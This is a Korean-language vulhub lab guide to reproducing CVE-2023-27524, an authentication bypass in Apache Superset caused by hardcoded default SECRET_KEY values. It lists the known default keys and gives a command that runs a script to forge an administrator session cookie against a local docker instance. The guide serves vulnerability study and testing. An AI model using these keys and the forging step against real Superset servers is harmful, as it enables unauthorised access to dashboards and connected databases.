# Apache Superset 하드코딩된 JWT 비밀 키로 인한 인증 우회 (CVE-2023-27524)

> 화이트햇 스쿨 3기 - [임희진 (@hanataba227)](https://github.com/hanataba227)

[영어 버전(Chinese version)](https://github.com/vulhub/vulhub/blob/master/superset/CVE-2023-27524/README.md)
[중국어 버전(Chinese version)](https://github.com/vulhub/vulhub/blob/master/superset/CVE-2023-27524/README.zh-cn.md)

Apache Superset은 시각적이고 직관적이며 인터랙티브한 데이터 탐색 및 시각화 플랫폼입니다.

Apache Superset에는 하드코딩된 JWT 비밀 키 취약점(CVE-2023-27524)이 존재합니다.  
이 애플리케이션은 세션 쿠키에 서명하는 데 사용되는 기본 `SECRET_KEY` 값을 포함하여 배포됩니다.  
관리자가 이 기본 키를 변경하지 않는 경우, 공격자는 유효한 세션 쿠키를 위조하여 모든 사용자(관리자 포함)로 인증할 수 있습니다.  
이를 통해 인증되지 않은 사용자가 Superset 대시보드, 연결된 데이터베이스에 접근할 수 있으며,  
궁극적으로 원격 코드 실행까지 이어질 수 있습니다.

[CVE-2023-37941](../CVE-2023-37941/README.md)과 결합할 경우, 인증을 우회한 뒤 직렬화 취약점을 이용해  
인증되지 않은 공격자가 원격 코드 실행까지 달성할 수 있습니다.  
이 문서는 **CVE-2023-27524의 악용**만 시연합니다.

참고자료:

- <https://www.horizon3.ai/attack-research/disclosures/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/>
- <https://github.com/horizon3ai/CVE-2023-27524>

## 환경 구축

다음 명령어를 실행하여 Apache Superset 2.0.1 서버를 시작하세요:

```
docker compose up -d
```

서버가 시작된 후, `http://your-ip:8088`에서 Superset에 접근할 수 있습니다.  
기본 로그인 계정은 `admin/vulhub`입니다.

## 취약점 재현

이 취약점은 Superset이 다음 중 하나의 하드코딩된 기본 `SECRET_KEY` 값을 사용하는 데에서 발생합니다:

- `\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h` (버전 < 1.4.1)
- `CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET` (버전 >= 1.4.1)
- `thisISaSECRET_1234` (배포 템플릿)
- `YOUR_OWN_RANDOM_GENERATED_SECRET_KEY` (문서)
- `TEST_NON_DEV_SECRET` (docker compose)

관리자 세션(사용자 ID가 1인 세션) 쿠키를 위조하려면 [CVE-2023-27524.py](CVE-2023-27524.py)를 사용하세요:

```bash
# 의존성 설치
pip install -r requirements.txt

# 관리자 세션(사용자 ID가 1) 쿠키 위조
python CVE-2023-27524.py --url http://your-ip:8088 --id 1 --validate
```

이 스크립트는 알려진 기본 비밀 키를 사용하여 세션 쿠키를 크래킹하려고 시도합니다.  
성공하면 사용자 ID=1(일반적으로 관리자 계정)로 새로운 세션 쿠키를 위조하고 로그인을 검증합니다.

![](1.png)

쿠키 값으로 이 JWT 토큰을 사용하세요(`Cookie: session=eyJ...` 형식). 그러면 Superset의 백엔드 엔드포인트에 접근할 수 있습니다:

![](2.png)
